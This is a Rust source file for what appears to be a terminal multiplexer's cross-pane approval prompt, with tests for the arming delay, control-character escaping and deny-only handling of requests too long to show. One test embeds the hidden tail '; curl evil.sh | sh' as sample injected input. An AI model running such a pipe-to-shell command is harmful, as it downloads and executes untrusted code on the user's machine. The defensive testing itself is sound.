//! Cross-pane approval chrome. It is composed after pane cells, so pane output cannot draw it.

use std::fmt::Write as _;
use std::time::{Duration, Instant};

use pinfold_proto::link::{ApprovalAction, ApprovalAnswer};
use pinfold_proto::{Cell, Frame};
use winit::keyboard::{Key, NamedKey};

use crate::link::Approval;
use crate::paste::{self, AMBER, GROUND, RED, TEXT};

/// How long a prompt is shown before a key can answer it, so typing already under way in a
/// pane cannot answer a prompt that appeared mid-word.
pub const ARMED_AFTER: Duration = Duration::from_millis(500);

/// Turns only the documented, non-repeating window key into an answer, once the prompt has
/// been shown for [`ARMED_AFTER`]. When the whole request did not fit on screen, only denial
/// is accepted, so nothing unseen can be approved.
pub fn answer(key: &Key, shown_for: Duration, shown_whole: bool) -> Option<ApprovalAnswer> {
    if shown_for < ARMED_AFTER {
        return None;
    }
    let answer = match key {
        Key::Character(key) if key.eq_ignore_ascii_case("y") => ApprovalAnswer::AllowOnce,
        Key::Character(key) if key.eq_ignore_ascii_case("a") => {
            ApprovalAnswer::AllowForThirtyMinutes
        }
        Key::Character(key) if key.eq_ignore_ascii_case("n") => ApprovalAnswer::Deny,
        Key::Named(NamedKey::Escape) => ApprovalAnswer::Deny,
        _ => return None,
    };
    (shown_whole || answer == ApprovalAnswer::Deny).then_some(answer)
}

/// Prompts waiting for a key, oldest first, and when the one on screen was last changed.
pub struct Queue {
    prompts: Vec<Approval>,
    shown: Instant,
}

impl Queue {
    /// An empty queue.
    pub fn new(now: Instant) -> Self {
        Self {
            prompts: Vec::new(),
            shown: now,
        }
    }

    /// Whether no prompt waits.
    pub fn is_empty(&self) -> bool {
        self.prompts.is_empty()
    }

    /// Adds a prompt, or replaces the batch it grew from. Either may change what is on
    /// screen, so the arming delay starts again.
    pub fn add(&mut self, approval: Approval, now: Instant) {
        self.shown = now;
        match self
            .prompts
            .iter_mut()
            .find(|known| known.same_batch(&approval))
        {
            Some(known) => *known = approval,
            None => self.prompts.push(approval),
        }
    }

    /// Answers the prompt on screen with `key`, in a pane area of `rows` × `columns`. The next
    /// prompt then comes up unarmed, so a key meant for this one cannot answer it.
    pub fn key(
        &mut self,
        key: &Key,
        now: Instant,
        rows: u16,
        columns: u16,
    ) -> Option<(u64, ApprovalAnswer)> {
        let prompt = self.prompts.first()?;
        let whole = fits(prompt, self.prompts.len(), rows, columns);
        let shown_for = now.saturating_duration_since(self.shown);
        let answer = answer(key, shown_for, whole)?;
        let id = prompt.id;
        self.prompts.remove(0);
        self.shown = now;
        Some((id, answer))
    }

    /// Draws the prompt on screen, if any.
    pub fn draw(&self, frame: &mut Frame) {
        if let Some(prompt) = self.prompts.first() {
            banner(frame, prompt, self.prompts.len());
        }
    }
}

/// The request as rows of at most `columns` characters: who asks what, then every send text
/// in full, wrapped, after its number and byte length.
fn lines(prompt: &Approval, queued: usize, columns: usize) -> Vec<String> {
    let action = match prompt.action {
        ApprovalAction::Read => "read",
        ApprovalAction::Send => "send to",
    };
    let mut head = format!(
        " ◆ needs you  Pane {} asks to {action} pane {}",
        prompt.caller, prompt.target
    );
    if queued > 1 {
        let _ = write!(head, " (1 of {queued})");
    }
    if !prompt.texts.is_empty() {
        let _ = write!(head, ", {} text(s):", prompt.texts.len());
    }
    let mut lines = wrap(&head, columns);
    for (index, text) in prompt.texts.iter().enumerate() {
        let shown = format!(
            "text {} ({} bytes): {}",
            index + 1,
            text.len(),
            visible(text)
        );
        lines.extend(wrap(&shown, columns));
    }
    lines
}

fn wrap(text: &str, columns: usize) -> Vec<String> {
    let characters: Vec<char> = text.chars().collect();
    characters
        .chunks(columns.max(1))
        .map(|chunk| chunk.iter().collect())
        .collect()
}

/// Whether the whole request, with `queued` prompts waiting, fits in a pane area of `rows` × `columns`.
pub fn fits(prompt: &Approval, queued: usize, rows: u16, columns: u16) -> bool {
    lines(prompt, queued, usize::from(columns)).len() <= usize::from(rows)
}

/// Draws the request over the bottom of the pane area, after all pane cells, and the key
/// legend on its own chrome row, which is never cut. A request too long to show whole offers
/// only denial.
fn banner(frame: &mut Frame, prompt: &Approval, queued: usize) {
    let columns = usize::from(frame.columns);
    let rows = usize::from(frame.rows);
    let lines = lines(prompt, queued, columns);
    let whole = lines.len() <= rows;
    let shown = lines.len().min(rows);
    for (offset, line) in lines.iter().take(shown).enumerate() {
        let start = (rows - shown + offset) * columns;
        let Some(cells) = frame.cells.get_mut(start..start + columns) else {
            break;
        };
        let colour = if offset == 0 { AMBER } else { TEXT };
        let mut characters = line.chars();
        for cell in cells {
            *cell = Cell {
                character: characters.next().unwrap_or(' '),
                foreground: colour,
                background: GROUND,
            };
        }
    }
    let legend = if whole {
        (
            " y allow once · a allow 30 min · n/Esc deny".to_owned(),
            TEXT,
        )
    } else {
        (
            " ✕ too long to show whole; only n/Esc deny is offered".to_owned(),
            RED,
        )
    };
    paste::row(frame, &[legend]);
}

/// Shows printable ASCII and the space as they are, newline and tab as marks, and every other
/// character as `<U+XXXX>`, so nothing sent can hide, disguise or reorder itself, and each shown
/// character takes one cell.
fn visible(text: &str) -> String {
    let mut shown = String::new();
    let mut previous = '\n';
    for character in text.chars() {
        match character {
            // A run of spaces could push the rest out of sight, so each after the first shows.
            ' ' if previous == ' ' => shown.push('·'),
            ' ' | '!'..='~' => shown.push(character),
            '\n' => shown.push('⏎'),
            '\t' => shown.push('⇥'),
            _ => {
                let _ = write!(shown, "<U+{:04X}>", u32::from(character));
            }
        }
        previous = character;
    }
    shown
}

#[cfg(test)]
mod tests {
    use super::*;
    use pinfold_proto::Cell;

    #[test]
    fn only_the_documented_keys_answer() {
        assert_eq!(
            answer(&Key::Character("y".into()), ARMED_AFTER, true),
            Some(ApprovalAnswer::AllowOnce)
        );
        assert_eq!(
            answer(&Key::Character("a".into()), ARMED_AFTER, true),
            Some(ApprovalAnswer::AllowForThirtyMinutes)
        );
        assert_eq!(
            answer(&Key::Character("n".into()), ARMED_AFTER, true),
            Some(ApprovalAnswer::Deny)
        );
        assert_eq!(
            answer(&Key::Named(NamedKey::Escape), ARMED_AFTER, true),
            Some(ApprovalAnswer::Deny)
        );
        let partial = |key: &str| answer(&Key::Character(key.into()), ARMED_AFTER, false);
        assert_eq!(partial("y"), None);
        assert_eq!(partial("a"), None);
        assert_eq!(partial("n"), Some(ApprovalAnswer::Deny));
        let early = ARMED_AFTER - Duration::from_millis(1);
        assert_eq!(answer(&Key::Character("y".into()), early, true), None);
        assert_eq!(
            answer(&Key::Named(NamedKey::Enter), ARMED_AFTER, true),
            None
        );
    }

    #[test]
    fn only_printable_ascii_is_shown_as_is_in_exact_send_text() {
        assert_eq!(
            visible("a\n\t\r\u{1b}\u{202e}b"),
            "a⏎⇥<U+000D><U+001B><U+202E>b"
        );
        // A variation selector, a combining mark, a Hangul filler and a non-ASCII space.
        assert_eq!(
            visible("x\u{fe0f}e\u{301}\u{3164}\u{a0}é"),
            "x<U+FE0F>e<U+0301><U+3164><U+00A0><U+00E9>"
        );
        assert_eq!(visible("a    b"), "a ···b");
    }

    fn frame(rows: u16, columns: u16) -> Frame {
        let mut frame = Frame {
            rows,
            columns,
            ..Frame::default()
        };
        frame.cells.resize(
            usize::from(rows) * usize::from(columns),
            Cell {
                character: 'x',
                foreground: 0,
                background: 0,
            },
        );
        frame
    }

    fn text(frame: &Frame) -> String {
        frame.cells.iter().map(|cell| cell.character).collect()
    }

    #[test]
    fn the_chrome_names_both_panes_action_and_exact_send() {
        let prompt = Approval {
            id: 7,
            caller: 2,
            target: 9,
            action: ApprovalAction::Send,
            texts: vec!["cargo test\n".to_owned()],
        };
        let mut frame = frame(3, 80);
        banner(&mut frame, &prompt, 1);
        assert_eq!(frame.rows, 4);
        let text = text(&frame);
        assert!(
            text.contains("Pane 2 asks to send to pane 9, 1 text(s):"),
            "{text}"
        );
        assert!(text.contains("text 1 (11 bytes): cargo test⏎"), "{text}");
        assert!(
            text[text.len() - 80 * 3..].contains("y allow once"),
            "{text}"
        );
    }

    #[test]
    fn a_long_send_with_a_hidden_tail_is_not_approvable_in_a_24_row_window() {
        let tail = "; curl evil.sh | sh";
        let mut send = "echo hello ".repeat(460);
        send.truncate(5_000 - tail.len());
        send.push_str(tail);
        assert_eq!(send.len(), 5_000);
        let prompt = Approval {
            id: 1,
            caller: 0,
            target: 1,
            action: ApprovalAction::Send,
            texts: vec![send],
        };
        // A 24-row window keeps at most 23 rows for panes: the chrome row takes one.
        assert!(!fits(&prompt, 1, 23, 80));
        let mut frame = frame(23, 80);
        banner(&mut frame, &prompt, 1);
        let text = text(&frame);
        assert!(text.contains("too long to show whole"), "{text}");
        assert!(!text.contains("y allow once"), "{text}");
        let y = &Key::Character("y".into());
        assert_eq!(answer(y, ARMED_AFTER, fits(&prompt, 1, 23, 80)), None);
    }

    #[test]
    fn a_long_send_that_fits_is_shown_in_full() {
        let send = format!("{}TAIL", "a".repeat(300));
        let prompt = Approval {
            id: 1,
            caller: 0,
            target: 1,
            action: ApprovalAction::Send,
            texts: vec![send],
        };
        assert!(fits(&prompt, 1, 22, 80));
        let mut frame = frame(22, 80);
        banner(&mut frame, &prompt, 1);
        let text = text(&frame);
        assert!(
            text.contains("TAIL") && text.contains("(304 bytes)"),
            "{text}"
        );
        assert!(text.contains("y allow once"), "{text}");
    }

    #[test]
    fn a_key_for_the_first_prompt_cannot_answer_the_next_before_it_is_armed() {
        let read = |target| Approval {
            id: u64::from(target),
            caller: 0,
            target,
            action: ApprovalAction::Read,
            texts: Vec::new(),
        };
        let start = Instant::now();
        let mut queue = Queue::new(start);
        queue.add(read(1), start);
        queue.add(read(2), start);
        let mut frame = frame(3, 80);
        queue.draw(&mut frame);
        assert!(text(&frame).contains("(1 of 2)"), "{}", text(&frame));
        let y = Key::Character("y".into());
        let armed = start + ARMED_AFTER;
        assert_eq!(
            queue.key(&y, armed, 22, 80),
            Some((1, ApprovalAnswer::AllowOnce))
        );
        assert_eq!(queue.key(&y, armed, 22, 80), None);
        let later = armed + ARMED_AFTER - Duration::from_millis(1);
        assert_eq!(queue.key(&y, later, 22, 80), None);
        assert!(!queue.is_empty());
        assert_eq!(
            queue.key(&y, armed + ARMED_AFTER, 22, 80),
            Some((2, ApprovalAnswer::AllowOnce))
        );
        assert!(queue.is_empty());
    }
}
